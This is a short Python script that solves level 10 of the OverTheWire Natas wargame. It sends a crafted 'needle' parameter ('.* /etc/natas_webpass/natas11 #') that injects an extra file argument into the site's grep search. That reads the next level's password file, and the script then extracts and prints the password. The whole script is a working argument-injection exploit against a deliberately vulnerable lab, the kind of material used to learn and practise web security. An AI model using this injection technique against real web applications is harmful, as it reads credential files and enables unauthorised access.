
#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level10pass):
    print "{+} Natas Level 10. Doing (more command injection) magic..."
    try:
        r = requests.get(url="http://natas10.natas.labs.overthewire.org/?needle=.* /etc/natas_webpass/natas11 #&submit=Search", auth=HTTPBasicAuth('natas10', level10pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("/etc/natas_webpass/natas11:(.*?)\n", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level10password" %(args[0]))
    level11pass = exploit(args[1])
    if level11pass != None:
        print "{$$} Level 11 Password is: %s" %(level11pass)

if __name__ == "__main__":
    main(args=sys.argv)
